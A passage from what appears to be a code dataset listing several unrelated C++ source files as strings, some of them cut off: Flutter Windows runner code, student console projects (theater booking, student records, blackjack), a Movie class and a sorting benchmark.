textNum[3] << textNum[4] << \"; Roll: \" << textNum[6] << textNum[7] << textNum[8] << textNum[9] << \"; Cam: \" << textNum[5] << \"; Expan: \" << textNum[0];\r\n    std::string var = oss.str();\r\n    Point text_position(source.cols / 2, y / 2);\r\n    putText(source, var, text_position, FONT_HERSHEY_COMPLEX, font_size, font_color, font_weight);\r\n}\r\n\r\nvoid find_track(Mat source,int x, int y) {\r\n    int j = 0;\r\n    int count = 0;\r\n    int test;\r\n    //rectangle(source, Point(500, 500), Point(600, 600), Scalar(0, 0, 255));\r\n    while (j == 0) {\r\n        test = int(source.at<Vec2b>(y + count, x)[0]);\r\n        cout << count << endl;\r\n        if (test < 90 && test > 50) {\r\n            rectangle(source,Point(y+count,x),Point(y + count + 100,x + 100),Scalar(0,255,255));\r\n            j = 1;\r\n        }\r\n        count += 1;\r\n        if (count > 1000) {\r\n            rectangle(source, Point(y + count, x), Point(y ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass Theater \r\n{\r\npublic:\r\n    void showdata() {\r\n        cout<<\"1. Display movies\"<<endl;\r\n        cout<<\"2. Display seat availability\"<<endl;\r\n        cout<<\"3. Book a ticket\"<<endl;\r\n        cout<<\"4. Cancel_ticket\"<<endl;\r\n        cout<<\"5. Exit\"<<endl;\r\n        cout<<endl;\r\n    }\r\n\r\n    void Display_movies() {\r\n        cout<<\"Available movies:\"<<endl;\r\n        cout<<\"0. Avengers (Action) - 150 min\"<<endl;\r\n        cout<<\"1. Jawan (Action thriller) - 120 min\"<<endl;\r\n        cout<<\"2. The Nun (Horror) - 145 min\"<<endl;\r\n        cout<< \"---------------------------\"<<endl;\r\n    }\r\n\r\n    void Display_seat_availability(char seats[7][7]) \r\n\t{\r\n        cout<<\"Seat availability:\"<<endl;\r\n        for(int i=0;i<7;i++) \r\n\t\t{\r\n            for(int j=0;j<7;j++) \r\n\t\t\t{\r\n                if(seats[i][j]=='O') \r\n\t\t\t\t{\r\n                    cout<<'O'<<\" \"; \r\n                } else \r\n\t\t\t\t{\r\n                    cout<<'X'<<\" \"; \r\n                }\r\n            }\r\n            cout<<endl;\r\n        }\r\n        cout<<\"-----------------------------\"<< endl;\r\n    }\r\n};\r\n\r\nclass Booking : public Theater \r\n{\r\npublic:\r\n    char seats[7][7]; \r\n\r\n    Booking() \r\n\t{\r\n        for(int i=0;i<7;i++) \r\n\t\t{\r\n            for(int j=0;j<7;j++) \r\n\t\t\t{\r\n                seats[i][j]='O';\r\n            }\r\n        }\r\n    }\r\n\r\n    void Book_ticket() \r\n\t{\r\n        Display_movies();\r\n\r\n        int movieIndex;\r\n        cout << \"Select movie index: \";\r\n        cin >> movieIndex;\r\n\r\n        if(movieIndex<0||movieIndex>2) \r\n\t\t{\r\n            cout<<\"Invalid movie index.\"<<endl;\r\n        }\r\n\r\n        Display_seat_availability(seats);\r\n\r\n        int row, column;\r\n        cout<<\"Choose row and column to select a seat for booking (1-7): \";\r\n        cin>>row>>column;\r\n\r\n        if(row>=1&&row<=7&&column>=1&&column<=7) \r\n\t\t{\r\n            if(seats[row-1][column-1]=='O') \r\n\t\t\t{\r\n                seats[row-1][column-1]='X';\r\n                cout<<\"Ticket booked successfully for movie index \"<< movieIndex<<\" and seat \"<<row<< \"-\"<< column << endl;\r\n            } \r\n\t\t\telse \r\n\t\t\t{\r\n                cout<<\"Seat is already booked. Please select another seat.\"<<endl;\r\n            }\r\n        \r\n        cout<< \"-------------------\"<< endl;\r\n    \r\n    \t}\r\n\t}\r\n\tvoid Cancel_ticket() \r\n\t{\r\n        Display_seat_availability(seats);\r\n        int row,column;\r\n        cout<<\"Choose row and column to cancel a booked seat(1-7): \";\r\n        cin>>row>>column;\r\n\r\n        if(row>=1&&row<=7&&column>=1&&column<=7) \r\n\t\t{\r\n            if(seats[row-1][column-1]=='X') \r\n\t\t\t{\r\n                seats[row - 1][column - 1]='O';\r\n                cout<<\"Ticket canceled successfully for seat \"<<row<< \"-\"<<column<<endl;\r\n            } \r\n\t\t\telse \r\n\t\t\t{\r\n                cout <<\"Seat is not booked. Please select a valid seat to cancel.\"<<endl;\r\n            }\r\n            cout<<\"-------------------\"<<endl;\r\n        }\r\n    }\r\n};\r\n\r\nvoid intro() \r\n{\r\n    cout<<\"WELCOME TO THEATER MANAGEMENT PROJECT\"<< endl;\r\n    cout<<\"Created by Vaishnavi and Pradnya\"<< endl;\r\n}\r\n\r\nint main() \r\n{\r\n    intro();\r\n    Booking b;\r\n    int choice;\r\n\r\n    while (true) \r\n\t{\r\n        b.showdata();\r\n        cout<<endl;\r\n        cout<<\"Enter your choice: \";\r\n        cin>>choice;\r\n\r\n        switch(choice) \r\n\t\t{\r\n            case 1:\r\n                b.Display_movies();\r\n                break;\r\n            case 2:\r\n                b.Display_seat_availability(b.seats);\r\n                break;\r\n            case 3:\r\n                b.Book_ticket();\r\n                break;\r\n            case 4:\r\n            \tb.Cancel_ticket();\r\n            case 5:\r\n                cout<<\"Exiting the program\"<< endl;\r\n                \r\n            default:\r\n                cout<<\"Invalid choice\"<< endl;\r\n\t\r\n        }\r\n        \r\n    }\r\n    return 1;\r\n}\r\n\r\n\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "//PROJECT: Student Record Management System using C++\n//Written by Md Zakaullah\n#include<iostReam>\nusing namespace std;\nstring Roll_no[30],name[30],Class[30],course[30],mobile_no[30],admission_year[30];\nint total=0;\nvoid Enter()\n{\nint ch=0;\ncout<<\"How many students do u want to Enter??\"<<endl;\ncin>>ch;\nif(total==0)\n{\ntotal=ch+total;\nfor(int i=0;i<ch;i++)\n{\ncout<<\"\\nEnter the Data of student \"<<i+1<<endl<<endl;\ncout<<\"Enter Roll NO:: \"<<endl;\ncin>>Roll_no[i];\ncout<<\"Enter Name: \"<<endl;\ncin>>name[i];\ncout<<\"Enter Class: \"<<endl;\ncin>>Class[i];\ncout<<\"Enter Course: \"<<endl;\ncin>>course[i];\ncout<<\"Enter Mobile NO: \"<<endl;\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \"<<endl;\ncin>>admission_year[i];\n}\n}\nelse\n{\nfor(int i=total;i<ch+total;i++)\n{\ncout<<\"\\nEnter the Data of student \"<<i+1<<endl<<endl;\ncout<<\"Enter Roll NO \";\ncin>>Roll_no[i];\ncout<<\"Enter Name: \";\ncin>>name[i];\ncout<<\"Enter Class: \";\ncin>>Class[i];\ncout<<\"Enter Course: \";\ncin>>course[i];\ncout<<\"Enter Mobile NO: \";\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \";\ncin>>admission_year[i];\n}\ntotal=ch+total;\n}\n}\nvoid show()\n{\nif(total==0)\n{\ncout<<\"No Data is Entered\"<<endl;\n}\nelse\n{\nfor(int i=0;i<total;i++)\n{\ncout<<\"\\nData of Student \"<<i+1<<endl<<endl;\ncout<<\"Roll NO \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"CouRse \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\n}\n}\n}\nvoid search()\n{\nif(total==0)\n{\ncout<<\"No data is Entered\"<<endl;\n}\nelse\n{\nstring Rollno;\ncout<<\"Enter the Roll no of student\"<<endl;\ncin>>Rollno;\nfor(int i=0;i<total;i++)\n{\nif(Rollno==Roll_no[i])\n{\ncout<<\"Roll NO \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"CouRse \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\n}\n}\n}\n}\nvoid update()\n{\nif(total==0)\n{\ncout<<\"No data is Entered\"<<endl;\n}\nelse{\nstring Rollno;\ncout<<\"Enter the Roll no of student which you want to update\"<<endl;\ncin>>Rollno;\nfor(int i=0;i<total;i++)\n{\nif(Rollno==Roll_no[i])\n{\ncout<<\"\\nPrevious data\"<<endl<<endl;\ncout<<\"Data of Student \"<<i+1<<endl;\ncout<<\"Roll NO: \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"Course \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\ncout<<\"\\nEnter new data\"<<endl<<endl;\ncout<<\"Enter Roll NO \";\ncin>>Roll_no[i];\ncout<<\"Enter Name: \";\ncin>>name[i];\ncout<<\"Enter Class: \";\ncin>>Class[i];\ncout<<\"Enter CouRse: \";\ncin>>course[i];\ncout<<\"Enter Mobile NO: \";\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \";\ncin>>admission_year[i];\n}\n}\n}\n}\nvoid Delete()\n{\nif(total==0)\n{\ncout<<\"No data is Entered yet\"<<endl;\n}\nelse\n{\nint a;\ncout<<\"Are you Sure to Delete Data?\"<<endl;\ncout<<\"Press 1 to delete all Record\"<<endl;\ncin>>a;\nif(a==1)\n{\ntotal=0;\ncout<<\"All Record is deleted..!!\"<<endl;\n}\nelse\n{\ncout<<\"Please Press 1 to Delete All Record\"<<endl;\n}\n}\n}\nint main() \n{\nint value;\nwhile(true)\n{\ncout<<\"\\nPress 1 to Enter data\"<<endl<<endl;\ncout<<\"PRess 2 to Show data\"<<endl<<endl;\ncout<<\"PRess 3 to Search data\"<<endl<<endl;\ncout<<\"Press 4 to Update data\"<<endl<<endl;\ncout<<\"Press 5 to Delete data\"<<endl<<endl;\ncout<<\"Press 6 to Quit\"<<endl<<endl;\ncin>>value;\nswitch(value)\n{\ncase 1:\nEnter();\nbreak;\ncase 2:\nshow();\nbreak;\ncase 3:\nsearch();\nbreak;\ncase 4:\nupdate();\nbreak;\ncase 5:\nDelete();\nbreak;\ncase 6:\nexit(0);\nbreak;\ndefault:\ncout<<\"Invalid input\"<<endl;\nbreak;\n}\n}\n}",
    "\n#include \"Movie.h\"\n#define HASH_START 17\n#define RES_MULT 31\n\n/**\n * hash function used for a unordered_map (implemented for you)\n * @param movie shared pointer to movie\n * @return an integer for the hash map\n */\nstd::size_t sp_movie_hash (const sp_movie &movie)\n{\n  std::size_t res = HASH_START;\n  res = res * RES_MULT + std::hash<std::string> () (movie->get_name ());\n  res = res * RES_MULT + std::hash<int> () (movie->get_year ());\n  return res;\n}\n\n/**\n * equal function used for an unordered_map (implemented for you)\n * @param m1\n * @param m2\n * @return true if the year and name are equal else false\n */\nbool sp_movie_equal (const sp_movie &m1, const sp_movie &m2)\n{\n  return !(*m1 < *m2) && !(*m2 < *m1);\n}\n\nMovie::Movie (const std::string &name, int year)\n{\n  this->name = name;\n  this->year = year;\n}\n\nstd::string Movie::get_name () const\n{\n  return name;\n}\n\nint Movie::get_year () const\n{\n  return year;\n}\n\nbool operator< (Movie const &lhs, Movie const &rhs)\n{\n  if (lhs.get_year () < rhs.get_year ())\n  {\n\treturn true;\n  }\n  if (lhs.get_year () > rhs.get_year ())\n  {\n\treturn false;\n  }\n  if (lhs.get_name () < rhs.get_name ())\n  {\n\treturn true;\n  }\n  return false;\n}\n\nstd::ostream &operator<< (std::ostream &os, const Movie &movie)\n{\n  os << movie.get_name () << \" (\" << movie.get_year () << \")\" << std::endl;\n  return os;\n}\n",
    "#include <chrono>\n#include <iostream>\n#include <unistd.h>\n#include <numeric>\n#include <algorithm>\n#include <vector>\n#include \"SortingAlgorithm.hpp\"\n#include <iomanip>\n\nusing namespace std;\n\ntemplate<typename T>\ndouble TimeBubble(vector<T>& v)\n{\n    chrono::steady_clock::time_point t_begin = chrono::steady_clock::now();\n    SortLibrary::BubbleSort(v);\n    chrono::steady_clock::time_point t_end = chrono::steady_clock::now();\n\n    double timeElapsed = chrono::duration_cast<chrono::nanoseconds>(t_end-t_begin).count();\n    return timeElapsed;\n}\n\ntemplate<typename T>\ndouble TimeMerge(vector<T>& v)\n{\n    chrono::steady_clock::time_point t_begin = chrono::steady_clock::now();\n    SortLibrary::MergeSort(v);\n    chrono::steady_clock::time_point t_end = chrono::steady_clock::now();\n\n    double timeElapsed = chrono::duration_cast<chrono::nanoseconds>(t_end-t_begin).count();\n    return timeElapsed;\n}\n\n\nint main(int argc, char ** argv)\n{\n    int n = 0;\n    size_t dimv = stoi(argv[1]);\n    unsigned int iters = 100;\n    vector<int> v(dimv);\n    double time_Bubble = 0;\n    double time_Merge = 0;\n\n    cout << scientific << setprecision(4);\n    // Vector of random integers in range 0-987\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<dimv; i++){\n            v[i] = rand() % 987;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v = time_Bubble/iters;\n    double time_MergeSort_v = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a random integers vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v << endl\n         << \"MergeSort : \" << time_MergeSort_v << endl << endl;\n\n\n    // Vector of random doubles in range 0-1\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    vector<double> w(dimv);\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<dimv; i++){\n            w[i] = rand();\n        }\n        vector<double> w_copia = w;\n\n        time_Bubble += TimeBubble(w);\n        time_Merge += TimeMerge(w_copia);\n    }\n    double time_BubbleSort_w = time_Bubble/iters;\n    double time_MergeSort_w = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a random doubles vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_w << endl\n         << \"MergeSort : \" << time_MergeSort_w << endl << endl;\n\n\n    // Vector of ascending ordered integers\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    vector<int> v_copia = v;\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v3 = time_Bubble/iters;\n    double time_MergeSort_v3 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a ordered integers vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v3 << endl\n         << \"MergeSort : \" << time_MergeSort_v3 << endl << endl;\n\n\n    unsigned int half_dim = dimv/2;\n    // Vector of ordered integers with the fist half perturbed\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<half_dim; i++){\n            v[i] = rand() % half_dim;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v1 = time_Bubble/iters;\n    double time_MergeSort_v1 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a integers vector with the fist half of elements perturbed\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v1 << endl\n         << \"MergeSort : \" << time_MergeSort_v1 << endl << endl;\n\n\n    // Vector of ordered integers with the second half perturbed\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=half_dim; i<dimv; i++){\n            v[i] = rand() % dimv + half_dim;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v2 = time_Bubble/iters;\n    double time_MergeSort_v2 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a integers vector with the second half of elements perturbed\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v2 << endl\n         << \"MergeSort : \" << time_MergeSort_v2 << endl << endl;\n\n\n    // Vector of ordered integers which elements have been switched in pairs\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    int dimv_floor = (dimv/2)*2;\n    for (unsigned int ",
    "\r\n#include <iostream>\r\n#include <stdlib.h>\r\nint Choice;\r\nint HitFunction(int PlayerHitHand);\r\nint SplitHitFunction(int SplitHitHand1);\r\nint SplitHit2Function(int SplitHitHand2);\r\nint SplitStay(int DealerHand);\r\nint StayFunction(int DealerStayHand);\r\nusing std::cout;\r\nusing std::cin;\r\nusing std::endl;\r\nint main()\r\n{\r\n\tsrand(static_cast<int>(time(NULL)));\r\n\tbool Play = true;\r\n\tbool Splitplay = false;\r\n\tint DealerCard1 = rand() % 11 + 1;\r\n\tint DealerCard2 = rand() % 11 + 1;\r\n\tint PlayerCard1 = rand() % 11 + 1;\r\n\tint PlayerCard2 = rand() % 11 + 1;\r\n\tint PlayerCard3 = rand() % 11 + 1;\r\n\tint PlayerCard4 = rand() % 11 + 1;\r\n\tint DealerHand = DealerCard1 + DealerCard2;\r\n\tint PlayerHand = PlayerCard1 + PlayerCard2;\r\n\tif (PlayerCard1 && PlayerCard2 == 11)\r\n\t{\r\n\t\tPlayerCard1 -= 1;\r\n\t\tcout << \"Playercard1 is now equal to: \" << PlayerCard1 << endl;\r\n\t}\r\n\tif (DealerCard1 && DealerCard2 == 11)\r\n\t{\r\n\t\tDealerCard1 -= 1;\r\n\t\tcout << \"Dealercard1 is now equal to: \" << DealerCard1 << endl;\r\n\t}\r\n\tif (DealerHand == 21)\r\n\t{\r\n\t\tcout << \"Dealer has a natural blackjack you lose!\" << endl;\r\n\t\tPlay = false;\r\n\t\tSplitplay = false;\r\n\t\treturn 0;\r\n\t}\r\nif (PlayerCard1 == PlayerCard2 || Splitplay == true)\r\n{\r\n\t\t\r\nchar YesNo;\r\ncout << \"Your first card: \" << PlayerCard1 << \" \" << \"Your second card: \" << PlayerCard2 << endl;\r\ncout << \"Would you like to split?\" << endl;\r\ncout << \"Y/N\" << endl;\r\ncin >> YesNo;\r\nint PlayerHandSplit1 = PlayerCard1 + PlayerCard3;\r\nint PlayerHandSplit2 = PlayerCard2 + PlayerCard4;\r\nif (YesNo == 'Y' || YesNo == 'y')\r\n{\r\n\tdo\r\n\t{\r\n\t\tbool Hit1 = true;\r\n\t\tbool Hit = true;\r\n\t\tSplitplay = true;\r\n\t\tcout << \"Spliting...\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 <<\r\n\t\t\" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tcout << \"Would you like to hit?\" << endl;\r\n\t\tcout << \"1)Hit\" << endl;\r\n\t\tcout << \"2)Stay\" << endl;\r\n\t\tcin >> Choice;\r\n\tswitch (Choice)\r\n\t{\r\n\tcase 1:\r\n\twhile (Hit1)\r\n\t{\r\n\t\tPlayerHandSplit1 += SplitHitFunction(PlayerHandSplit1);\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n        \tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\tif (PlayerHandSplit1 > 21 || PlayerHandSplit2 > 21)\r\n\t{\r\n\t\tcout << \"You busted! You lose!\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tSplitplay = false;\r\n\t\tHit1 = false;\r\n\t}\r\n\tchar YesNo;\r\n\tcout << \"Would you like to hit again?\" << endl;\r\n\tcout << \"Y/N?\" << endl;\r\n\tcin >> YesNo;\r\n\tif (YesNo == 'Y' || YesNo == 'y')\r\n\t{\r\n\r\n\t}\r\n\telse\r\n\t{\r\n\t\tHit1 = false;\r\n\t}\r\n\t}\r\n\tbreak;\r\n\tcase 2:\r\n\twhile (DealerHand <= 16)\r\n\t{\r\n\t\tDealerHand += SplitStay(PlayerHandSplit1);\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Player:\" << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2\r\n\t\t<< \" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tHit1 = false;\r\n\t\tSplitplay = false;\r\n\t\tPlay = false;\r\n\tif (DealerHand > 21)\r\n\t{\r\n\t\tcout << \"Dealer busted! You win!\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tSplitplay = false;\r\n\t\tHit = false;\r\n\t\tPlay = false;\r\n\t}\r\n\t}\r\n\t\t\t\t\t\t\r\n\tbreak;\r\n\tdefault:\r\n\tbreak;\r\n\t}\r\n\tif (Play == true)\r\n\t{\r\n\t\tcout << \"Spliting...\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 <<\r\n\t\t\" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tcout << \"For second hand hit?\" << endl;\r\n\t\tcout << \"Would you like to hit?\" << endl;\r\n\t\tcout 